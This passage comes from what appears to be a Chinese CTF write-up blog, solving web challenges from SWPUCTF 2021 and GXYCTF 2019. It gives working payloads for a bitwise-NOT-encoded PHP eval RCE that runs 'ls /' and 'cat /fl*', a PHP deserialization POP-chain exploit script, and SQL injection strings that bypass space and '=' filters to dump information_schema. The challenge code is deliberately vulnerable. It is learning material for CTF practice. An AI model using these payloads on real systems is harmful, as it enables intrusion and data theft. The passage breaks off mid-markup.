variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\t'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\r'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\+'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\['</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\^'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\]'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\"'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\-'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\$'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\*'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\?'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\&lt;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\>'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\='</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\`'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blackitem</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$blackitem</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/m'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$wllm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"LTLT说不能用这些奇奇怪怪的符号哦！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-zA-Z]/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$wllm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Ra's Al Ghul说不能用字母哦！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NoVic4说：不错哦小伙子，可你能拿到flag吗？\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$wllm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"蔡总说：注意审题！！！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>过滤了很多字符，常规的无字母 RCE 主要有三种方式：</p>\n<ol>\n<li>异或</li>\n<li>自增</li>\n<li>取反</li>\n</ol>\n<p>异或、自增全 g 了，使用取反。</p>\n<p>取反脚本：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>先使用 <code>system(&quot;ls /&quot;)</code> ；命令查看</p>\n<p>有哪些文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls /\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>得到</p>\n<blockquote>\n<p>%8C%86%8C%8B%9A%92<br />\n%93%8C%DF%D0</p>\n</blockquote>\n<p>于是构造 payload:</p>\n<blockquote>\n<p>?wllm=(<sub>%8C%86%8C%8B%9A%92)(</sub>%93%8C%DF%D0);</p>\n</blockquote>\n<p>可知有个 /flllllaaaaaaggggggg 文件，</p>\n<p>再次使用脚本：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"cat /fl*\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>得到</p>\n<blockquote>\n<p>%8C%86%8C%8B%9A%92<br />\n%DF%9C%9E%8B%DF%D0%99%93%D5</p>\n</blockquote>\n<p>构造 payload:</p>\n<blockquote>\n<p>?wllm=(<sub>%8C%86%8C%8B%9A%92)(</sub>%DF%9C%9E%8B%DF%D0%99%93%D5)</p>\n</blockquote>\n<p>最终得到 flag。</p>\n<h2 id=\"2023912\"><a class=\"anchor\" href=\"#2023912\">#</a> 2023/9/12</h2>\n<h3 id=\"swpuctf-2021-新生赛pop\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛pop\">#</a> [SWPUCTF 2021 新生赛] pop</h3>\n<h4 id=\"pop链反序列化php代码审计\"><a class=\"anchor\" href=\"#pop链反序列化php代码审计\">#</a> pop 链，反序列化，php, 代码审计</h4>\n<p>进入题目，是一个人 php 代码审计：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w44m</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$admin</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'aaa'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$passwd</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'123456'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">Getflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'w44m'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'08067'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'nono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w22m</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$w00m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">w00m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w33m</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$w00m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$w22m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">w00m</span><span class=\"token operator\">-></span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">w22m</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token variable\">$w00m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'w00m'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$w00m</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>审计代码后，得知反序列化参数为 &quot;w00m&quot;，</p>\n<p>查找入口</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 传参 $w00m, 直接反序列化，入口就在__destruct，或者_wakeup，这里的 w22m 符合条件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w22m</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$w00m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">w00m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>找链子</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># echo一个对象，调用__toString方法，然后调用内部w00m的方法，由此可得链子如下</pre></td></tr><tr><td data-num=\"2\"></td><td><pre># w22m.__<span class=\"token function\">destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>.w00m->w33m.__<span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>.w00m->w44m.<span class=\"token function\">Getflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>写 exp</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w44m</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$admin</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'w44m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$passwd</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'08067'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w22m</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$w00m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w33m</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$w00m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$w22m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">w22m</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">w44m</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">w33m</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">w00m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">-></span> <span class=\"token property\">w00m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">-></span> <span class=\"token property\">w22m</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Getflag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这里如果不想要在脚本中 url 编码，由于不可见字符的影响，在网站修改数据时注意把私有、保护型的变量中的值 %20 改为 %00。</p>\n<h3 id=\"swpuctf-2021-新生赛sql\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛sql\">#</a> [SWPUCTF 2021 新生赛] sql</h3>\n<h4 id=\"空格绕过等号绕过sql注入\"><a class=\"anchor\" href=\"#空格绕过等号绕过sql注入\">#</a> 空格绕过，等号绕过，SQL 注入</h4>\n<p>进入后发现它求我们输点东西，发现网页标题似乎有参数，打开控制台看到参数是 wllm。</p>\n<p>尝试</p>\n<blockquote>\n<p>?wllm=1</p>\n</blockquote>\n<p>回显出</p>\n<blockquote>\n<p>Your Login name:xxx<br />\nYour Password:yyy</p>\n</blockquote>\n<p>再尝试</p>\n<blockquote>\n<p>?wllm=1'%23</p>\n</blockquote>\n<p>发现并没有报错，说明是单引号闭合。</p>\n<p>看看有几列：</p>\n<blockquote>\n<p>?wllm=1' order by 4%23</p>\n</blockquote>\n<p>回显出 &quot;请勿非法操作&quot;，说明有东西被过滤了，经过测试发现是空格被过滤了，直接用 hackbar 自带的绕过空格尝试绕过：</p>\n<blockquote>\n<p>?wllm=1'/**/order/**/by/**/4%23</p>\n</blockquote>\n<p>得到回显：</p>\n<blockquote>\n<p>Unknown column '4' in 'order clause'</p>\n</blockquote>\n<p>再尝试 3 列，发现成功。</p>\n<p>测试回显在哪两列显示：</p>\n<blockquote>\n<p>?wllm=0'/**/union/**/select/**/1,2,3%23</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<p>Your Login name:2<br />\nYour Password:3</p>\n</blockquote>\n<p>查看所有表：</p>\n<blockquote>\n<p>?wllm=0'union/**/select/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata%23</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<p>Your Login name:2<br />\nYour Password:information_schema,m</p>\n</blockquote>\n<p>发现没显示全，用函数截取以下发现 substr,right,left 全部都被过滤了，只有 mid 能用。</p>\n<p>这里就不截取了。</p>\n<p>查表：</p>\n<blockquote>\n<p>?wllm=0'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()</p>\n</blockquote>\n<p>发现又有东西被过滤了，经过测试发现是 &quot;=&quot; 号，用 like 代替。</p>\n<blockquote>\n<p>?wllm=0'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23</p>\n</blockquote>\n<p>得知一个表：LTLT_flag，不出意外 flag 应该就在里面。</p>\n<p>查询库中所有的字段：</p>\n<blockquote>\n<p>?wllm=0'union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()%23</p>\n</blockquote>\n<p>知道了一个叫 flag 的字段。</p>\n<p>直接查询，再配合 mid 即可。</p>\n<blockquote>\n<p>?wllm=0'/**/union/**/select/**/1,2,flag/**/from/**/LTLT_flag</p>\n</blockquote>\n<blockquote>\n<p>?wllm=0'/**/union/**/select/**/1,2,mid(flag,start,end)/**/from/**/LTLT_flag</p>\n</blockquote>\n<h2 id=\"2023913\"><a class=\"anchor\" href=\"#2023913\">#</a> 2023/9/13</h2>\n<h3 id=\"gxyctf-2019ping-ping-ping\"><a class=\"anchor\" href=\"#gxyctf-2019ping-ping-ping\">#</a> [GXYCTF 2019]Ping Ping Ping</h3>\n<h4 id=\"正则绕过rcephp\"><a class=\"anchor\" href=\"#正则绕过rcephp\">#</a> 正则绕过，rce，php</h4>\n<p>打开题目后，是一个输入框，上面写着</p>\n<blockquote>\n<p>听说 php 可以执行系统函数？我来康康</p>\n</blockquote>\n<p>根据提示应该会使用 linux 命令，题目叫 ping ping ping ,</p>\n<p>输入下本地 ip 127.0.0.1 看看能不能 ping 通。</p>\n<p>结果显示：</p>\n<blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PING <span class=\"token number\">127.0</span>.0.1 <span class=\"token punctuation\">(</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">)</span>: <span class=\"token number\">56</span> data bytes</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">64</span> bytes from <span class=\"token number\">127.0</span>.0.1: <span class=\"token assign-left variable\">icmp_seq</span><span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token assign-left variable\">ttl</span><span class=\"token operator\">=</span><span class=\"token number\">64</span> <span class=\"token assign-left variable\">time</span><span class=\"token operator\">=</span><span class=\"token number\">0.041</span> ms</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">64</span> bytes from <span class=\"token number\">127.0</span>.0.1: <span class=\"token assign-left variable\">icmp_seq</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token assign-left variable\">ttl</span><span class=\"token operator\">=</span><span class=\"token number\">64</span> <span class=\"token assign-left variable\">time</span><span class=\"token operator\">=</span><span class=\"token number\">0.056</span> ms</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">64</span> bytes from <span class=\"token number\">127.0</span>.0.1: <span class=\"token assign-left variable\">icmp_seq</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> <span class=\"token assign-left variable\">ttl</span><span class=\"token operator\">=</span><span class=\"token number\">64</span> <span class=\"token assign-left variable\">time</span><span class=\"token operator\">=</span><span class=\"token number\">0.047</span> ms</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">64</span> bytes from <span 